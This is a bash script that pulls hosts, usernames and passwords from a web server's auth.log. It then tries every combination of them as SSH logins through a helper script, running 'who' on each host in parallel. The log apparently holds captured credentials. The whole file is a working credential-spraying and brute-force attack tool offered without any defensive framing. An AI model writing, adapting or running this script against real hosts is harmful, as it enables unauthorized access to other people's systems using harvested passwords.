#! /usr/bin/env bash
set -euo pipefail

LOG=/srv/http/auth.log

HOSTS="$(awk '{print $6}' "$LOG" | sort -u)"
USERS="$(awk '{print $7}' "$LOG" | sort -u)"
PSWDS="$(awk '{print $8}' "$LOG" | sort -u)"

for host in $HOSTS ; do
    for user in $USERS ; do
        for pswd in $PSWDS ; do
            printf "%q %q %q %q %q\0" ./sshlogin.sh "$pswd" "$host" "$user" who
        done
    done
done |
xargs -0 -P $(nproc) -L 1

#awk '{
#host = $(NF-2);
#hosts[i++] = host;
#
#user = $(NF-1);
#j = ++ users[host][0];
#users[host][j] = user;
#
#pswd = $NF;
#j = ++ pswds[host][0];
#pswds[host][j] = pswd;
#}' "$LOG"
